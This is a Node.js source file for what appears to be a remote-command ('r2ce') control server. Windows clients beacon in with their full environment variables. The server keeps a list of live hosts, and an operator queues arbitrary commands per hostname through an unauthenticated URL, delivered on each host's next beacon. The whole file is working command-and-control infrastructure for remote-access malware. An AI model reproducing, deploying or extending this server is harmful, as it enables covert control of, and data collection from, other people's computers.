const { v4: uuidv4 } = require('uuid');
const express = require('express');
const ws = require('ws');
const path = require('path');

const _port = 6022;
const _app = express();

const _activePulseList = {};
const _pendingCommands = {};

_app.use('/static', express.static(path.join(__dirname, 'public')))
_app.use(express.json());

_app.use((req, res, next) => {
    console.log(`@(${new Date().toISOString()}) | [${req.ip}] ${req.method} ${req.url}`);
    next();
});

_app.get('/', (req, res) => {
    res.send('r2ce-server');
});

_app.get('/command/pending', (req, res) => {
    res.send(_pendingCommands);
});

_app.get('/command/:hostname/:cmd', (req, res) => {
    if (_activePulseList[req.params.hostname]) {
        _pendingCommands[req.params.hostname] = { command: req.params.cmd, id: uuidv4() };
        res.sendStatus(201);
    }
    else {
        res.sendStatus(406);
    }
});

_app.get('/pulse/list', (req, res) => {
    res.send(_activePulseList);
});

_app.post('/pulse', (req, res) => {
    console.log(`>> incoming pulse from ${req.body.COMPUTERNAME} @ ${req.body.HOMEPATH}`);

    _activePulseList[req.body.COMPUTERNAME] = {
        env: req.body,
        expires: Date.now() + 60 * 1000
    };

    const pendingCommand = _pendingCommands[req.body.COMPUTERNAME];
    if (pendingCommand) {
        delete _pendingCommands[req.body.COMPUTERNAME];
        res.status(201).header('cid', pendingCommand.id).send(pendingCommand.command);
    }
    else {
        res.sendStatus(204);
    }
});

const server = _app.listen(_port, () => {
    console.log(`r2ce-server @ http://localhost:${_port}`)
});

const wss = new ws.Server({ noServer: true });

wss.on('connection', (socket, request) => {
    socket.id = uuidv4();

    console.log(`+  wss.connection [${socket.id}]`);

    socket.send(`establish-uid=${socket.id}`);

    socket.on('message', (data) => {
        console.log(`+    socket.message [${socket.id}]: ${data}`);
    });

    socket.on('data', (data) => {
        console.log(`+    socket.data [${socket.id}]: ${data}`);
    });

    socket.on('disconnect', () => {
        console.log(`+    socket.disconnected [${socket.id}]`);
    });
});

wss.on('close', (arg) => {
    console.log(`+  wss.close ${arg}}`);
});

server.on('upgrade', (request, socket, head) => {
    console.log(`server.upgrade`);
    wss.handleUpgrade(request, socket, head, socket => {
        wss.emit('connection', socket, request);
    });
});